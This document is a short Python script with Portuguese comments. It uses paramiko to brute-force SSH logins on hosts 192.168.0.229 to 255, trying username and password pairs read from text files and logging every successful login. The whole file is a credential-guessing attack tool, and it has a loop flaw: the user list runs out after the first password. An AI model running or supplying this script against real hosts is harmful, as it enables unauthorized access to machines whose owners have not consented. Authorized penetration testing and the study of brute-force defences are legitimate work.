import paramiko
import logging

# Configurar as informações de conexão SSH
host_prefix = '192.168.0.'
users = open('code\\users.txt', 'r')
passwords = open('code\\passwords.txt', 'r')
logging.basicConfig(level=logging.INFO, filename="log\\program.log", format="%(asctime)s - %(levelname)s - %(message)s")

def sshAcess(passwords, users, host_prefix):
    # Iterar sobre uma faixa de endereços IP
    for i in range(229, 256):
        for password in passwords:
            for user in users:
                ip = host_prefix + str(i)
                
                # Inicializar um cliente SSH
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                try:
                    # Tentar fazer a conexão SSH
                    ssh.connect(ip, username=user, password=password, timeout=3)
                    
                    # Se a conexão for bem-sucedida, exibir uma mensagem
                    logging.info(f'{ip}:{user} Connected!')
                    
                    # Fechar a conexão SSH
                    ssh.close()
                    
                except paramiko.AuthenticationException:
                    # Se a autenticação falhar, exibir uma mensagem
                    print(f'{ip} Authentication Failed!')
                    
                except paramiko.SSHException:
                    # Se houver um erro SSH, exibir uma mensagem
                    print(f'{ip} SSH Error!')
                    
                except Exception as e:
                    # Se ocorrer uma exceção não tratada, exibir uma mensagem de erro genérica
                    print(f'{ip}:{user}Error: {str(e)}')

if __name__ == "__main__":
    sshAcess(passwords, users, host_prefix)